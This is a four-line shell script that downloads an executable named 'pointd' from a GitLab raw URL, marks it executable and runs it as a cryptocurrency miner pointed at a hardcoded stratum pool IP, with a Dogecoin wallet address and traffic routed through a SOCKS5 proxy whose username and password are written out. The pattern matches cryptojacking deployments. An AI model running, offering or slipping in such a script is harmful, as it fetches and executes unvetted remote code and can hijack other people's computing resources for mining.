apt update -y
wget https://gitlab.com/raufpermana22/donlod/-/raw/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://103.249.70.7:4563 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,mc=GXX -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
